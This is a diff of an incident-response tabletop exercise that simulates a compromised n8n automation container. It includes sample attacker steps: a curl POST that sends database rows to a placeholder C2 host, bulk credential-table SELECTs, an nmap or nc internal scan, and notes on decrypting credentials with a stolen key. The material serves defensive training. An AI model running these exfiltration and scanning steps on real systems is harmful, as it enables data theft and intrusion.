@@ -72,13 +72,13 @@ This tabletop exercise tests the Organization's ability to detect, contain, inve
 
 ### Background
 
-It is a normal operating day. All 19 containers are running on the VPS (`alpha-node`). Datadog shows green across the board. The most recent deployment was 48 hours ago - a routine workflow update to svc-automation. The cloud firewall is in its standard deny-all configuration with svc-tunnel as the sole ingress path.
+It is a normal operating day. All 19 containers are running on the VPS (`alpha-node`). Datadog shows green across the board. The most recent deployment was 48 hours ago, a routine workflow update to svc-automation. The cloud firewall is in its standard deny-all configuration with svc-tunnel as the sole ingress path.
 
 The current access posture:
 - System Owner has operator-level access via svc-gateway (no active admin session)
 - No JIT elevation requests are pending
 - Last SSH session ended 6 hours ago
-- All audit logs are shipping normally to Datadog via svc-event-shipper and Fluentd
+- All audit logs are shipping normally to Datadog via svc-event-shipper, Fluentd, and svc-langfuse-worker (for Squire trace observability)
 
 ---
 
@@ -94,6 +94,9 @@ Rule: Terminal shell in container
 Output: Shell spawned in svc-automation (user=node, parent=node,
     cmdline=sh -c /bin/sh, container_id=a1b2c3d4e5f6)
 ```
+
+<!-- TODO(et): the current Sigma rule detections/sigma/infra/container-shell-spawn-restricted.yml allowlists shell-spawn alerts for PostgreSQL, Vault, Tunnel, Keycloak, Falco, and OpenClaw. svc-automation (n8n) is NOT in that list, so this inject would not trigger the rule as configured. Either add n8n to the rule's container allowlist OR change the inject service to one that is already covered. -->
+
 
 Simultaneously, Datadog flags an anomalous DNS query originating from svc-automation:
 
@@ -193,19 +196,32 @@ svc-db metrics (last 5 minutes):
    SELECT * FROM execution_entity LIMIT 10000;
    SELECT * FROM credentials_entity;
    SELECT * FROM workflow_entity;
-   COPY (SELECT * FROM execution_entity) TO STDOUT;
+   # Realistic exfil for the n8n DB role (which does NOT hold pg_read_server_files
+   # or replication privileges, so `COPY ... TO STDOUT` would error). The
+   # attacker instead chunks SELECTs and POSTs the rows out via curl from the
+   # compromised container, or pipes them into a DNS TXT-record encoder.
+   SELECT * FROM execution_entity WHERE id BETWEEN 1 AND 1000;
+   SELECT * FROM execution_entity WHERE id BETWEEN 1001 AND 2000;
+   # Followed by, from inside svc-automation: curl -X POST https://<c2>/ingest -d @rows.json
 ```
 
-The attacker has used the database credentials from svc-automation's environment variables to connect directly to svc-db and is exfiltrating workflow execution history, stored credentials (encrypted), and workflow definitions. The exfiltrated data is being staged to the C2 domain via DNS TXT record exfiltration.
+The attacker has used the database credentials from svc-automation's environment variables to connect directly to svc-db and is exfiltrating workflow execution history, stored credentials (encrypted), and workflow definitions. The exfiltrated data is being staged to the C2 domain via DNS TXT record exfiltration and an HTTPS POST channel.
 
-Meanwhile, svc-detection also flags:
+Meanwhile, svc-detection also flags. The n8n container image does NOT ship with `nmap`, so the attacker first dropped a scanning binary (which itself trips the `n8n unexpected binary` Sigma rule). The inject below assumes that prior alert has fired.
 
 ```
-Priority: Warning
-Rule: Network tool in container
-Output: nmap process detected in svc-automation
-    (user=node, cmdline=nmap -sn 172.18.0.0/16)
+T+0:  Priority: High
+      Rule: n8n unexpected binary (T1105)
+      Output: Unexpected file written and made executable in svc-automation
+              (file=/tmp/.scan, container=svc-automation)
+
+T+10s Priority: Warning
+      Rule: Network tool in container
+      Output: nmap process detected in svc-automation
+              (user=node, cmdline=/tmp/.scan -sn 172.18.0.0/16)
 ```
+
+Alternative realistic path: if the attacker uses tools already in the image, the same scan can be performed with `nc -zv` against each candidate IP (which would not trip the unexpected-binary rule and tests whether the playbook catches port-scan patterns without binary-drop).
 
 The attacker is scanning the internal bridge network to identify other reachable containers.
 
@@ -232,13 +248,15 @@ The attacker is scanning the internal bridge network to identify other reachable
 **INJECT:**
 
 The following containment actions have been executed:
-- svc-automation container disconnected from `net-core` bridge network
-- Database credentials rotated on svc-db (old credentials revoked)
-- svc-automation container stopped (not removed - preserved for forensics)
-- Cloud firewall rule added to block outbound DNS to `suspicious-c2-domain.xyz`
-- All other containers verified running with expected process trees
+- svc-automation container disconnected from `internal-net` bridge network
+- Database credentials rotated on svc-db (old credentials revoked; existing sessions terminated via `pg_terminate_backend`)
+- svc-automation container stopped (not removed; preserved for forensics)
+- C2 egress blocked: DigitalOcean Cloud Firewalls only support IP- and port-based rules, so the actual containment was:
+  - Cloudflare DNS Firewall block on `suspicious-c2-domain.xyz` (domain-based blocking lives at the resolver / Cloudflare layer)
+  - host-level iptables DROP on the resolved IP set as a defense-in-depth backstop
+- All other containers verified running with expected process trees (`docker top` per container; distroless containers checked from host via nsenter)
 - Teleport session recordings confirm the attack did not originate from an SSH session (no interactive sessions active during the incident window)
-- CI/CD pipeline integrity verified: no unauthorized commits or workflow changes in the code repository
+- CI/CD pipeline integrity verified: no unauthorized commits or workflow changes in the code repository (`gh run list`, `gh api /repos/<owner>/<repo>/commits`)
 
 Datadog confirms:
 - Anomalous DNS queries have stopped
@@ -329,8 +347,30 @@ Total time: Detection at T+2min, containment initiated at T+15min, full containm
 6. **Metrics:** What metrics do you report?
   - Mean Time to Detect (MTTD): 2 minutes
   - Mean Time to Contain (MTTC): 15 minutes
-  - Mean Time to Recover (MTTR): 3.5 hours
+  - Mean Time to Recover (MTTR): 3.5 hours (target <4h; this is 88% of target, flag as marginal in the scorecard, not "well within")
   - Data exposure scope: workflow data, encrypted credentials, execution history
+
+---
+
+### Status of Phase 5 Gaps as of 2026-06-24
+
+The Phase 5 discussion enumerates detection gaps and architectural changes. Status of each at this date:
+
+| Item | Type | Status as of 2026-06-24 |
+|------|------|-------------------------|
+| `env` command execution Sigma rule | Detection | **OPEN**: no rule added since TTX authored 2026-03-11 |
+| Bulk SELECT rate Sigma rule (postgres log pattern) | Detection | **OPEN** |
+| Network scanner Sigma rule (post-binary-drop) | Detection | **OPEN** (covered partially by existing `n8n-unexpected-binary.yml`) |
+| Webhook HMAC signing | Policy / Code | **OPEN** |
+| Container network microsegmentation (svc-automation isolated from svc-db) | Architecture | **OPEN** |
+| Egress allowlists per container | Architecture | **OPEN** |
+| Database query proxy with anomaly detection | Architecture | **OPEN** |
+| WAF / request validation at tunnel ingress | Architecture | **OPEN** |
+| Mandatory webhook authentication policy | Policy | **OPEN** |
+| Secrets injection via mounted files (deprecate env vars) | Architecture | **OPEN** |
+| Dependency scanning SLA (critical patches within 24h) | Policy | **IN-PROGRESS**: Trivy + Renovate are wired in CI; SLA not yet codified |
+
+> The next TTX run should use "detection rules added since last exercise" as an evaluation criterion. As of this status snapshot, 0 of the 4 detection gaps identified at the original exercise have been closed in 3+ months. <!-- TODO(et): file POAM entries for each OPEN item above so the gaps are tracked in POAM_PLAN_OF_ACTION.md rather than only here. -->
 
 ---
 
@@ -366,7 +406,7 @@ This section documents the expected correct actions for each phase, referencing 
 |--------|------------------|-----------|
 | **Stop exfiltration** | Order of operations: 1. **Disconnect svc-automation from network** (`docker network disconnect net-core svc-automation`) - fastest, stops all traffic. 2. **Revoke database credentials on svc-db** (ALTER USER, pg_terminate_backend). 3. **Stop svc-automation container** (preserve for forensics). | IR-4, SC-7 |
 | **Scope exfiltration** | Query svc-db `pg_stat_activity` for the attacker's session history. Cross-reference Datadog metrics (47 MB transferred). Analyze DNS TXT record sizes to estimate data exfiltrated via C2 channel. | AU-6 |
-| **Credential encryption** | svc-automation encrypts stored credentials at rest using its encryption key. However, the attacker ran `env` and may have the encryption key. Assume stored credentials are compromised. | SC-28 |
+| **Credential encryption** | **Critical insight:** svc-automation encrypts stored credentials in `credentials_entity` using `N8N_ENCRYPTION_KEY` (sourced from `CD_N8N_KEY`). The attacker ran `env` inside svc-automation, so they have that key. The encrypted blob plus the key permits offline decryption of every stored workflow credential. Assume all stored credentials are compromised and rotate them. | SC-28 |
 | **Communication plan** | Internal: Incident commander briefs all stakeholders. External: No breach notification required yet - assess whether exfiltrated data includes PII or third-party credentials. Prepare notification templates as a precaution. | IR-6, IR-7 |
 | **DRP invocation** | **Not yet.** The incident is contained to one service and the database. Other services are operational. DRP invocation criteria: loss of 3+ critical services or total platform unavailability. | CP-2 |
 | **Blast radius** | All containers on `net-core` bridge are reachable from svc-automation. However, network access does not equal authenticated access. Containers without exposed ports or credentials in svc-automation's env are at lower risk. Priority check: svc-secrets, svc-identity. | SC-7 |
@@ -375,7 +415,7 @@ This section documents the expected correct actions for each phase, referencing 
 
 | Action | Expected Behavior | Reference |
 |--------|------------------|-----------|
-| **Rebuild approach** | **Clean image deployment** - never restore a compromised container from backup. Pull the known-good image from the trusted registry. Verify image signature (Cosign). Rebuild workflow configurations from version-controlled source. | CP-10, SI-7 |
+| **Rebuild approach** | **Clean image deployment**: never restore a compromised container from backup. Pull the known-good image from the trusted registry. Verify image digest against the value pinned in `docker-compose.yaml`. If Cosign signing is in place for the image, also run `cosign verify`; otherwise rely on digest pinning. <!-- TODO(et): align with PLAYBOOK_COMPROMISED_CONTAINER.md which currently lists Trivy but not Cosign. Either add Cosign to the parent playbook or remove the Cosign expectation here. --> Rebuild workflow configurations from version-controlled source. | CP-10, SI-7 |
 | **Recovery order** | 1. svc-db (verify data integrity, no unauthorized modifications). 2. svc-secrets (confirm sealed, no unauthorized access). 3. svc-tunnel (verify ingress path integrity). 4. svc-detection (update rules). 5. svc-automation (clean image, new credentials, hardened config). | CP-10 |
 | **Persistence check** | 1. Diff the preserved container filesystem against the base image. 2. Inspect for added cron entries, modified /etc files, planted binaries. 3. Verify no new Docker volumes, networks, or images were created on the host. 4. Check host `/var/lib/docker` for escape artifacts. 5. Verify host SSH authorized_keys file is unchanged. | SI-7 |
 | **Secret rotation scope** | All secrets accessible to svc-automation: database credentials, encryption key, JWT secret, all stored workflow API keys, webhook tokens. Generate new values via secrets manager. Update all dependent configurations. | IA-5 |
@@ -522,6 +562,7 @@ Complete this template within 5 business days of the exercise.
 | Exercise | Frequency | Last Conducted | Next Scheduled |
 |----------|-----------|---------------|----------------|
 | Operation Phantom Container (Container Compromise) | Semi-annual | [Date of first run] | [+6 months] |
+| [SQUIRE_TABLETOP_EXERCISE.md](SQUIRE_TABLETOP_EXERCISE.md): Squire Jailbreak and Containment | Quarterly | [Date of first run] | next slot |
 | [Future: Supply Chain Compromise scenario] | Semi-annual | - | [TBD] |
 | [Future: Insider Threat scenario] | Annual | - | [TBD] |
 | [Future: DigitalOcean Outage / DRP scenario] | Annual | - | [TBD] |
